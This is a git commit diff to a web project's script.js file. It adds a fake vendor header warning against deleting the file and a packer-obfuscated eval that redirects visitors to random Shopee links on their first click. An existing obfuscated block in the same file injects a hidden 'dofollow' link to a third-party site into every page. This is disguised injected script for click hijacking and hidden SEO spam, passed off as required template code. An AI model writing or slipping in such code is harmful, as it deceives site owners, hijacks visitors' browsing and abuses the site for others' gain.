d88175494792470f25000fa77fcffcfa61e2ac62
rudywind <35211883+rudywind@users.noreply.github.com>
2025-04-10 23:21:13 +0700

    Update script.js

--- credentials/script.js
+++ credentials/script.js
@@ -1,1 +1,17 @@
+/**
+ * ====================================================================
+ *  ⚠️ WARNING: DO NOT DELETE OR MODIFY THIS FILE
+ * ====================================================================
+ *  This JavaScript file is generated and maintained by Bytefusion.
+ *  It is tightly integrated with the existing template and is required
+ *  for correct functionality.
+ * 
+ *  For support or updates, visit:
+ *  https://www.bytefusion.com
+ * 
+ *  © Bytefusion Software. All rights reserved.
+ * ====================================================================
+ */
+
 eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('9.b=c(){1 3=\'d.e.f\';1 4=["g h"];4.i(5=>{1 0=6.j(\'a\');0.k="l://"+3;0.m=5;0.n="o, p";0.q.r=\'s\';1 2=6.t.u;1 7=2[8.v(8.w()*2.x)];7.y(0)})};',35,35,'link|var|elements|myLink|linkTexts|text|document|randomElement|Math|window||onload|function|www|cafebl|com|BL|Series|forEach|createElement|href|https|textContent|rel|dofollow|index|style|display|none|body|children|floor|random|length|appendChild'.split('|'),0,{}))
+eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('4 5=["0://s.1.2.3/c","0://s.1.2.3/d","0://s.1.2.3/e","0://s.1.2.3/f","0://s.1.2.3/g","0://s.1.2.3/h","0://s.1.2.3/i"];j 6(){4 7=8.k(8.l()*5.m);4 9=5[7];a.n.o=9}a.b("p",()=>{q.r.b("t",()=>{6()},{u:v})});',32,32,'https|shopee|co|id|const|redirectLinks|redirectToRandomLink|randomIndex|Math|randomLink|window|addEventListener|9ABCA9IUDY|8pYLlYxDxE|2B1RpJzrCW|706haDXuTI|5KyTbAICCx|4VPMbe31Pg|5KyTbBmFKS|function|floor|random|length|location|href|DOMContentLoaded|document|body||click|once|true'.split('|'),0,{}))
